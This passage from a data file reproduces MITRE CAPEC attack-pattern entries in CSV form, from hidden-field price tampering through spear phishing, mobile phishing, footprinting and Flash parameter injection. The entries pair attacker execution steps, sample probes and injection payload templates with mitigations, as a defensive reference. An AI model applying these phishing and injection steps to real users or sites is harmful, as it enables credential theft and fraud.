server, which processes the modified data. For example, eShoplifting is a data manipulation attack against an on-line merchant during a purchasing transaction. The manipulation of price, discount or quantity fields in the transaction message allows the adversary to acquire items at a lower cost than the merchant intended. The adversary performs a normal purchasing transaction but edits hidden fields within the HTML form response that store price or other information to give themselves a better deal. The merchant then uses the modified pricing information in calculating the cost of the selected items.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:77::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probe target web application] The adversary first probes the target web application to find all possible pages that can be visited on the website.:TECHNIQUE:Use a spidering tool to follow and record all links:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.::STEP:2:PHASE:Explore:DESCRIPTION:[Find hidden fields] Once the web application has been traversed, the adversary looks for all hidden HTML fields present in the client-side.:TECHNIQUE:Use the inspect tool on all modern browsers and filter for the keyword hidden:TECHNIQUE:Specifically look for hidden fields inside form elements.::STEP:3:PHASE:Experiment:DESCRIPTION:[Send modified hidden fields to server-side] Once the adversary has found hidden fields in the client-side, they will modify the values of these hidden fields one by one and then interact with the web application so that this data is sent to the server-side. The adversary observes the response from the server to determine if the values of each hidden field are being validated.::STEP:4:PHASE:Exploit:DESCRIPTION:[Manipulate hidden fields] Once the adversary has determined which hidden fields are not being validated by the server, they will manipulate them to change the normal behavior of the web application in a way that benefits the adversary.:TECHNIQUE:Manipulate a hidden field inside a form element and then submit the form so that the manipulated data is sent to the server.::\",\"::The targeted site must contain hidden fields to be modified.::The targeted site must not validate the hidden fields with backend processing.::\",\"\",\"::The adversary must have the ability to modify hidden fields by editing the HTTP response to the server.::\",\"\",\"\",\"\",\"\",\"::602::\",\"\",\"\",\n163,\"Spear Phishing\",Detailed,Draft,\"An adversary targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:98::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain useful contextual detailed information about the targeted user or organization] An adversary collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.:TECHNIQUE:Conduct web searching research of target. See also: CAPEC-118.:TECHNIQUE:Identify trusted associates, colleagues and friends of target. See also: CAPEC-118.:TECHNIQUE:Utilize social engineering attack patterns such as Pretexting. See also: CAPEC-407.:TECHNIQUE:Collect social information via dumpster diving. See also: CAPEC-406.:TECHNIQUE:Collect social information via traditional sources. See also: CAPEC-118.:TECHNIQUE:Collect social information via Non-traditional sources. See also: CAPEC-118.::STEP:2:PHASE:Experiment:DESCRIPTION:[Optional: Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.:TECHNIQUE:Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).:TECHNIQUE:Optionally obtain a legitimate SSL certificate for the new domain name.::STEP:3:PHASE:Experiment:DESCRIPTION:[Optional: Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.:TECHNIQUE:Use spidering software to get copy of web pages on legitimate site.:TECHNIQUE:Manually save copies of required web pages from legitimate site.:TECHNIQUE:Create new web pages that have the legitimate site's look at feel, but contain completely new content.::STEP:4:PHASE:Experiment:DESCRIPTION:[Optional: Build variants of the website with very specific user information e.g., living area, etc.] Once the adversary has their website which duplicates a legitimate website, they need to build very custom user related information in it. For example, they could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.:TECHNIQUE:Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim.::STEP:5:PHASE:Exploit:DESCRIPTION:[Convince user to enter sensitive information on adversary's site.] An adversary sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to adversary's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.:TECHNIQUE:Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.:TECHNIQUE:Place phishing link in post to online forum.::STEP:6:PHASE:Exploit:DESCRIPTION:[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.:TECHNIQUE:Log in to the legitimate site using another user's supplied credentials.::\",\"::None. Any user can be targeted by a Spear Phishing attack.::\",\"::SKILL:Spear phishing attacks require specific knowledge of the victims being targeted, such as which bank is being used by the victims, or websites they commonly log into (Google, Facebook, etc).:LEVEL:Medium::\",\"::An adversay must have the ability communicate their phishing scheme to the victims (via email, instance message, etc.), as well as a website or other platform for victims to enter personal information into.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Information Leakage::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges:NOTE:Privilege Escalation::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:Data Modification::\",\"::Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind.::\",\"::The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity that happened in a different area from where they live (details might be provided by the spear phishers) and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An adversary has just collected the target's online banking information which can now be used by them to log into the target's bank account and transfer money to a bank account of the adversary's choice.::An adversary can leverage a weakness in the SMB protocol by sending the target, an official looking e-mail from their employer's IT Department stating that their system has vulnerable software, which they need to manually patch by accessing an updated version of the software by clicking on a provided link to a network share. Once the link is clicked, the target is directed to an external server controlled by the adversary or to a malicious file on a public access share. The SMB protocol will then attempt to authenticate the target to the adversary controlled server, which allows the adversary to capture the hashed credentials over SMB. These credentials can then be used to execute offline brute force attacks or a Pass The Hash attack.::\",\"::451::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1534:ENTRY NAME:Internal Spearfishing::::TAXONOMY NAME:ATTACK:ENTRY ID:1566.001:ENTRY NAME:Phishing: Spearfishing Attachment::::TAXONOMY NAME:ATTACK:ENTRY ID:1566.002:ENTRY NAME:Phishing: Spearfishing Link::::TAXONOMY NAME:ATTACK:ENTRY ID:1566.003:ENTRY NAME:Phishing: Spearfishing via Service::::TAXONOMY NAME:ATTACK:ENTRY ID:1598.001:ENTRY NAME:Phishing for Information: Spearfishing Service::::TAXONOMY NAME:ATTACK:ENTRY ID:1598.002:ENTRY NAME:Phishing for Information: Spearfishing Attachment::::TAXONOMY NAME:ATTACK:ENTRY ID:1598.003:ENTRY NAME:Phishing for Information: Spearfishing Link::\",\"\","
  },
  "doc-234f7e99375239c62b2f450d28b95482": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n164,\"Mobile Phishing\",Detailed,Stable,\"An adversary targets mobile phone users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Mobile Phishing is a variation of the Phishing social engineering technique where the attack is initiated via a text or SMS message, rather than email. The user is enticed to provide information or visit a compromised web site via this message. Apart from the manner in which the attack is initiated, the attack proceeds as a standard Phishing attack.\",\"::TERM:Smishing:DESCRIPTION:::TERM:MobPhishing:DESCRIPTION:::\",High,High,\"::NATURE:ChildOf:CAPEC ID:98::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph or similar attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.:TECHNIQUE:Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L):TECHNIQUE:Optionally obtain a legitimate SSL certificate for the new domain name.::STEP:2:PHASE:Explore:DESCRIPTION:[Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.:TECHNIQUE:Use spidering software to get copy of web pages on legitimate site.:TECHNIQUE:Manually save copies of required web pages from legitimate site.:TECHNIQUE:Create new web pages that have the legitimate site's look and feel, but contain completely new content.::STEP:3:PHASE:Exploit:DESCRIPTION:[Convince user to enter sensitive information on adversary's site.] An adversary sends a text message to the victim that has a call-to-action, in order to persuade the user into clicking the included link (which then takes the victim to the adversary's website) and logging in. The key is to get the victim to believe that the text message originates from a legitimate entity with which the victim does business and that the website pointed to by the URL in the text message is the legitimate website. A call-to-action will usually need to sound legitimate and urgent enough to prompt action from the user.:TECHNIQUE:Send the user a message from a spoofed legitimate-looking mobile number that asks the user to click on the included link.::STEP:4:PHASE:Exploit:DESCRIPTION:[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.:TECHNIQUE:Log in to the legitimate site using another user's supplied credentials::\",\"::An adversary needs mobile phone numbers to initiate contact with the victim.::An adversary needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their hooks to many potential victims.::An adversary needs to have a sufficiently compelling call to action to prompt the user to take action.::The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity.::\",\"::SKILL:Basic knowledge about websites: obtaining them, designing and implementing them, etc.:LEVEL:Medium::\",\"::Either mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack.::\",\"::You receive a text message from an entity that you are not even a customer of prompting you to log into your account.::You receive any text message that provides you with a link that takes you to a website which requires you to enter your credentials.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Do not follow any links that you receive within text messages and do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. Safe practices also include leveraging the entity's mobile application or directly typing the entity's URL in the browser and only then logging in. Never reply to any text messages that ask you to provide sensitive information of any kind.::\",\"::The target receives a text message stating that their Apple ID has been disabled due to suspicious activity and that they need to click on the link included in the message to log into their Apple account in order to enable it. The link in the text message looks legitimate and once the link is clicked, the login page is an exact replica of Apple's standard login page. The target supplies their login credentials and are then notified that their account has now been unlocked. However, the adversary has just collected the target's Apple account information, which can now be used by the adversary for a variety of purposes.::\",\"::451::\",\"\",\"\",\n165,\"File Manipulation\",Meta,Draft,\"An attacker modifies file contents or attributes (such as extensions or names) of files in a manner to cause incorrect processing by an application. Attackers use this class of attacks to cause applications to enter unstable states, overwrite or expose sensitive information, and even execute arbitrary code with the application's privileges. This class of attacks differs from attacks on configuration information (even if file-based) in that file manipulation causes the file processing to result in non-standard behaviors, such as buffer overflows or use of the incorrect interpreter. Configuration attacks rely on the application interpreting files correctly in order to insert harmful configuration information. Likewise, resource location attacks rely on controlling an application's ability to locate files, whereas File Manipulation attacks do not require the application to look in a non-default location, although the two classes of attacks are often combined.\",\"\",,Medium,\"\",\"\",\"::The target must use the affected file without verifying its integrity.::\",\"\",\"::None: No specialized resources are required to execute this type of attack. In some cases, tools can be used to better control the response of the targeted application to the modified file.::\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.003:ENTRY NAME:Masquerading: Rename System Utilities::\",\"\",\n166,\"Force the System to Reset Values\",Standard,Draft,\"An attacker forces the target into a previous state in order to leverage potential weaknesses in the target dependent upon a prior configuration or state-dependent factors. Even in cases where an attacker may not be able to directly control the configuration of the targeted application, they may be able to reset the configuration to a prior state since many applications implement reset functions.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:161::\",\"\",\"::The targeted application must have a reset function that returns the configuration of the application to an earlier state.::The reset functionality must be inadequately protected against use.::\",\"\",\"::None: No specialized resources are required to execute this type of attack. In some cases, the attacker may need special client applications in order to execute the reset functionality.::\",\"\",\"\",\"\",\"\",\"::306::1221::1232::\",\"\",\"\",\n167,\"White Box Reverse Engineering\",Standard,Draft,\"An attacker discovers the structure, function, and composition of a type of computer software through white box analysis techniques. White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:188::\",\"\",\"::Direct access to the object or software.::\",\"\",\"::Reverse engineering of software requires varying tools and methods that enable the decompiling of executable or other compiled objects.::\",\"\",\"\",\"\",\"\",\"::1323::\",\"\",\"\",\n168,\"Windows ::DATA Alternate Data Stream\",Detailed,Draft,\"An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. ADS allows multiple files to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:636::\",\"\",\"::The target must be running the Microsoft NTFS file system.::\",\"\",\"::The attacker must have command line or programmatic access to the target's files system with write/read permissions.::\",\"\",\"\",\"::Design: Use FAT file systems which do not support Alternate Data Streams.::Implementation: Use Vista dir with the -R switch or utility to find Alternate Data Streams and take appropriate action with those discovered.::Implementation: Use products that are Alternate Data Stream aware for virus scanning and system security operations.::\",\"\",\"::212::69::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Windows alternate data stream::\",\"\",\n169,\"Footprinting\",Meta,Stable,\"An adversary engages in probing and exploration activities to identify constituents and properties of the target.\",\"\",High,Very Low,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Request Footprinting] The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.:TECHNIQUE:Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.:TECHNIQUE:Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.:TECHNIQUE:DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.:TECHNIQUE:Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network.::\",\"::An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.::\",\"::SKILL:The adversary knows how to send HTTP request, run the scan tool.:LEVEL:Low::\",\"::The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Keep patches up to date by installing weekly or daily if possible.::Shut down unnecessary services/ports.::Change default passwords by choosing strong passwords.::Curtail unexpected input.::Encrypt and password-protect sensitive data.::Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.::\",\"::In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.::\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1217:ENTRY NAME:Browser Bookmark Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1592:ENTRY NAME:Gather Victim Host Information::::TAXONOMY NAME:ATTACK:ENTRY ID:1595:ENTRY NAME:Active Scanning::\",\"\",\n17,\"Using Malicious Files\",Standard,Draft,\"An attack of this type exploits a system's configuration that allows an adversary to either directly access an executable file, for example through shell access; or in a possible worst case allows an adversary to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:233::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine File/Directory Configuration] The adversary looks for misconfigured files or directories on a system that might give executable access to an overly broad group of users.:TECHNIQUE:Through shell access to a system, use the command ls -l to view permissions for files and directories.::STEP:2:PHASE:Experiment:DESCRIPTION:[Upload Malicious Files] If the adversary discovers a directory that has executable permissions, they will attempt to upload a malicious file to execute.:TECHNIQUE:Upload a malicious file through a misconfigured FTP server.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute Malicious File] The adversary either executes the uploaded malicious file, or executes an existing file that has been misconfigured to allow executable access to the adversary.::\",\"::System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.::\",\"::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::\",\"::Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Enforce principle of least privilege::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::\",\"::Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.::\",\"::732::285::272::59::282::270::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.005:ENTRY NAME:Hijack Execution Flow: Executable Installer File Permissions Weakness::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow: Services File Permissions Weakness::\",\"\",\n170,\"Web Application Fingerprinting\",Detailed,Draft,\"An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:541::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Request fingerprinting] Use automated tools or send web server specific commands to web server and wait for server's response.:TECHNIQUE:Use automated tools or send web server specific commands to web server and then receive server's response.::STEP:2:PHASE:Experiment:DESCRIPTION:[Increase the accuracy of server fingerprinting of Web servers] Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.:TECHNIQUE:Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.:TECHNIQUE:Send bad requests or requests of nonexistent pages to the server.:TECHNIQUE:Attacker takes existing automated tools to recognize the type and the version of the web server in use.::STEP:3:PHASE:Experiment:DESCRIPTION:[Identify Web Application Software] After the web server platform software has been identified, the attacker start to identify web application technologies such as ASP, .NET, PHP and Java on the server.:TECHNIQUE:Examine the file name extensions in URL, for example .php indicates PHP script interfaced with Apache server.:TECHNIQUE:Examine the HTTP Response Headers. This may leak information about software signatures:TECHNIQUE:Examine Cookies that may contain server's software information.:TECHNIQUE:Check error pages.::STEP:4:PHASE:Experiment:DESCRIPTION:[Identify Backend Database Version] Determining the database engine type can assist attackers' attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.:TECHNIQUE:Use tools to send bogus SQL query to the server and check error pages.::\",\"::Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.::\",\"::SKILL:Attacker knows how to send HTTP request, SQL query to a web application.:LEVEL:Low::\",\"::While simple fingerprinting can be accomplished with only a web browser, for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers, web-site crawlers, and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::\",\"::Implementation: Obfuscate server fields of HTTP response.::Implementation: Hide inner ordering of HTTP response header.::Implementation: Customizing HTTP error codes such as 404 or 500.::Implementation: Hide URL file extension.::Implementation: Hide HTTP response header software information filed.::Implementation: Hide cookie's software information filed.::Implementation: Appropriately deal with error messages.::Implementation: Obfuscate database type in Database API's error message.::\",\"::An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses. Response from Apache 1.3.23 $ nc apache.server.com80 GET / HTTP/3.0 HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1 Response from IIS 5.0 $ nc iis.server.com 80GET / HTTP/3.0 HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133 [REF-37]::\",\"::497::\",\"\",\"\",\n173,\"Action Spoofing\",Meta,Stable,\"An adversary is able to disguise one action for another and therefore trick a user into initiating one type of action when they intend to initiate a different action. For example, a user might be led to believe that clicking a button will submit a query, but in fact it downloads software. Adversaries may perform this attack through social means, such as by simply convincing a victim to perform the action or relying on a user's natural inclination to do so, or through technical means, such as a clickjacking attack where a user sees one interface but is actually interacting with a second, invisible, interface.\",\"\",High,Very High,\"\",\"\",\"::The adversary must convince the victim into performing the decoy action.::The adversary must have the means to control a user's interface to present them with a decoy action as well as the actual malicious action. Simple versions of this attack can be performed using web pages requiring only that the adversary be able to host (or control) content that the user visits.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Action spoofing can result in a wide variety of consequences and negatively affect all three elements of the security triad.::\",\"::Avoid interacting with suspicious sites or clicking suspicious links.::An organization should provide regular, robust cybersecurity training to its employees.::\",\"\",\"::451::\",\"\",\"\",\n174,\"Flash Parameter Injection\",Detailed,Draft,\"An adversary takes advantage of improper data validation to inject malicious global parameters into a Flash file embedded within an HTML document. Flash files can leverage user-submitted data to configure the Flash document and access the embedding HTML document.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:182::NATURE:CanAlsoBe:CAPEC ID:460::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:178::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Spider] Using a browser or an automated tool, an adversary records all instances of HTML documents that have embedded Flash files. If there is an embedded Flash file, they list how to pass global parameters to the Flash file from the embedding object.:TECHNIQUE:Use an automated tool to record all instances of URLs which have embedded Flash files and list the parameters passing to the Flash file.:TECHNIQUE:Use a browser to manually explore the website to see whether the HTML document has embedded Flash files or not and list the parameters passing to the Flash file.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine the application susceptibility to Flash parameter injection] Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase, the adversary attempts to use various techniques such as DOM based, reflected, flashvars, and persistent attacks depending on the type of parameter passed to the embedded Flash file.:TECHNIQUE:When the JavaScript 'document.location' variable is used as part of the parameter, inject '#' and the payload into the parameter in the URL.:TECHNIQUE:When the name of the Flash file is exposed as a form or a URL parameter, the adversary injects '?' and the payload after the file name in the URL to override some global value.:TECHNIQUE:When the arguments passed in the 'flashvars' attributes, the adversary injects '&' and payload in the URL.:TECHNIQUE:If some of the attributes of the <object> tag are received as parameters, the 'flashvars' attribute is injected into the <object> tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.:TECHNIQUE:If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur, with malicious code being injected into the Flash file and executed, every time the Flash file is loaded.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute Flash Parameter Injection Attack] Inject parameters into Flash file. Based on the results of the Experiment phase, the adversary crafts the underlying malicious URL containing injected Flash parameters and submits it to the web server. Once the web server receives the request, the embedding HTML document will controllable by the adversary.:TECHNIQUE:Craft underlying malicious URL and send it to the web server to take control of the embedding HTML document.::\",\"\",\"::SKILL:The adversary need inject values into the global parameters to the Flash file and understand the parent HTML document DOM structure. The adversary needs to be smart enough to convince the victim to click on their crafted link.:LEVEL:Medium::\",\"::The adversary must convince the victim to click their crafted link.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::User input must be sanitized according to context before reflected back to the user. The JavaScript function 'encodeURI' is not always sufficient for sanitizing input intended for global Flash parameters. Extreme caution should be taken when saving user input in Flash cookies. In such cases the Flash file itself will need to be fixed and recompiled, changing the name of the local shared objects (Flash cookies).::\",\"::The following are examples for different types of parameters passed to the Flash file. DOM-based Flash parameter injection <object><embed src=myFlash.swf flashvars=location=http://example.com/index.htm#&globalVar=e-v-i-l></embed></object> Passing parameter in an embedded URI <object type=application/x-shockwave-flash data=myfile.swf?globalVar=e-v-i-l ></object> Passing parameter in flashvars <object type=application/x-shockwafile.swf ve-flash data=my flashvars=language=English&globalVar=e-v-i-l></object> Persistent Flash Parameter Injection // Create a new shared object or read an existing one mySharedObject = SharedObject.getLocal(flashToLoad);if (_root.flashfile == undefined) { // Check whether there is a shared object saved if (mySharedObject.data.flash == null) { // Set a default value _root.flashfile = defaultFlash.swf; } else { // Read the flash file to load from the shared object _root.flashfile = mySharedObject.data.flash; } } // Store the 